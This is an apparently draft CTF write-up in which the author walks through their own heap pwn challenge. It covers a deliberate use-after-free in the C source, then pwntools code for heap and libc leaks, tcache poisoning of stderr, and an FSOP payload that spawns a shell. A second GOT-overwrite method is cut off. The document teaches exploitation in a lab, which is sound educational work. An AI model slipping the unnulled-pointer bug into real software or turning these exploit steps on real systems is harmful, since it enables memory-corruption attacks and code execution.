+++
date = '2025-12-31T17:36:25+08:00'
draft = true
title = 'NYP Dec CTF 2025 Labubu 6-8 different ways'
categories = ["writeup", "CTF"]
tags = ["heap", "pwn"]
+++

#### Introduction:

labubu labubu labubububububu labubu labewbew labbubu labubu labu labubu labububub

Labubu translation: I wrote a beginner challenge for NYP Dec CTF 2025. It is meant to be a simple introduction to **tcache poisoning** with a small twist to force solvers to be more creative.

#### Table of Contents:

1. Prerequisites.
1. Binary and source code review.
1. Exploit(s)

#### Prerequisites:

Go read this post on the basics of [tcache poisoning.](https://waheyy.github.io/post/liardancer/liardancerwriteup/)
The only difference here is since the binary has the **FULL RELRO** protection enabled, the binary's **Global Offset Table** (GOT) cannot be written to so we have to get creative with our write-what-where.

#### Source Code Review:

```C
#define MAX_LABUBU 0x10
#define LABUBU_SIZE 0x400

char *labubu_holder[MAX_LABUBU] = {0};
```

So here you can see that you can have 16 Labubus and each Labubu has a fixed size of 0x400 bytes.

```C
void make_labubu() {
  printf("idx?: ");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  labubu_holder[idx] = malloc(LABUBU_SIZE);
  printf("Your labubu has been bought!\n");
}
```

`make_labubu()` makes a Labubu of size 0x400.

```C
void sell_labubu() {
  printf("Which labubu to sell...\n");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  free(labubu_holder[idx]);
  printf("You monster...\n");
}
```
```
```


`sell_labubu()` frees a 0x400 byte region of memory and you can see that I do not null the pointer so I have a dangling pointer that can be used in a Use-After-Free(UAF).


```C
void name_labubu() {
  printf("Which labubu to name: \n");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  if (labubu_holder[idx] == NULL) {
    printf("There is no labubu there...\n");
    exit(1);
  }
  printf("Name your labubu\n");
  fgets(labubu_holder[idx], LABUBU_SIZE, stdin);
  printf("Your labubu has been named %s\n", labubu_holder[idx]);
}
```


`name_labubu()` lets you edit the 0x400 byte region of memory. This lets me make use of the dangling pointer to edit memory.

```C
void admire_labubu() {
  printf("Which limited edition 24k gold matcha performative labubu do you "
         "want to admire?\n");
  int idx = get_int();
  if (idx >= MAX_LABUBU || idx < 0) {
    exit(1);
  }
  if (labubu_holder[idx] == NULL) {
    printf("There is no labubu there...\n");
    exit(1);
  }
  write(1, labubu_holder[idx], LABUBU_SIZE);
}
```

`admire_labubu()` lets you read whatever that 0x400 byte region of memory is holding.

#### Exploit:

I will be going through my intended solve of the challenge before going into the other methods we can use. 

#### 1. First we need a heap leak, so we can bypass the [pointer mangling.](https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking)


So first we allocate a chunk and then free it and read it since we have a UAF.

```python
alloc(0) #one chunk allocated in heap.
free(0) #the chunk goes into tcache, the first 8 bytes becomes the forward pointer.
read(0) #now we can read it.
heapleak = p.recvuntil(b"Welcome", drop=True)[:6]
heapleak = u64(heapleak.ljust(8, b"\x00"))
print(f"This is heap leak: {hex(heapleak)}")
```

This makes it so that there is one chunk in tcache and once a chunk goes into tcache the first 8 bytes of the data section of chunk becomes the forward pointer. Since this chunk is the only chunk in the tcache its forward pointer is **NULL** and following the pointer mangle formula. 

**fd = (chunk address >> 12) ^ next chunk** 

if next chunk is **NULL** then the fd stored inside the chunk will be **(chunk_address >> 12) ^ NULL** which gives me `chunk_address >> 12` which is exactly what I need in a heap leak.

#### 2. We now need a Libc leak.

Usually to get a Libc leak in heap challenges, we have to make use of a technique called the **unsorted leak**. The unsorted leak makes use of the fact that the first chunk to go into the unsorted bin has its fd and bk pointing into the Libc and then we can read it for the leak.


So to get a libc leak, we allocate a chunk that goes into the unsorted bin and free it. Once freed we can read it back and take the values which will point into `main_arena+96` inside Libc.

put screenshot of main_arena+96

But if you try to do the same thing here, you will find a problem. Your chunks go straight into tcache and you cannot control the size, what do you do?????

Since tcache bins can only take 7 chunks, we can actually fill up the tcache with 7 chunks and once tcache is filled the chunks will be freed into unsorted and we can perform our Libc leak.

```python
for i in range(0, 9):
    alloc(i) #allocate 9 chunks. 7 chunks to fill, 1 chunk to free and last chunk for consolidation guard.

for i in range(0, 7):
    free(i) #free 7 chunks and now tcache is filled.

free(7) #here we free the chunk so it goes into unsorted bin.
read(7) #and now we can read the fd or bk to get the Libc leak.
libcleak = p.recvuntil(b"Welcome", drop=True)[:6]
libcleak = u64(libcleak.ljust(8, b"\x00"))
print(f"This is main_arena+96: {hex(libcleak)}")
main_arena_offset = 0x210ac0 + 96 #rmb to change this to the specific libc of the container
base = libcleak - main_arena_offset
print(f"This is libc base: {hex(base)}")
```

#### 3. Tcache poison and Method 1:

The intended method is to perform **FSOP** (file stream oriented programming). Since we the program ends with `exit()` we can find the address of `_IO_2_1_stderr_@@GLIBC_2.2.5` and use our tcache poison to overwrite it and when `exit()` is called and uses the file struct we gain code execution yay.

Now I will show you how i did my tcache poison.

```python
edit(2, p64(mangle(heapleak, stderr))) #change the fd of a freed chunk to stderr
alloc(13) # allocate chunks til I get my stderr struct back 
alloc(14)
alloc(15)
alloc(0)
alloc(1)
alloc(3) #this is my stderr struct back
```


Now we can edit stderr to be anything and we just pass in a stderr FSOP payload and exit and yay, we pop shell.

show ss of win

Here is my fsop payload.

```python
fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr-0x10
fs.chain = system
fs._codecvt = stderr
fs._wide_data = stderr - 0x48
fs.vtable = io_wfile_jumps
```

#### Method 2:

Since I gave a 0x400 sized arbitrary write, you have a lot of options on how you want to pop the shell and we now we begin flexing on the challenge by solving it every way I know how.

**Second method is a GOT overwrite.**

"B-b-bbut isn't the GOT unwritable cos of `FULL RELRO`??" you ask. 

"Ah you silly goose, the libc binary only has `PARTIAL RELRO`!", I reply.

So we will now target a Libc GOT entry



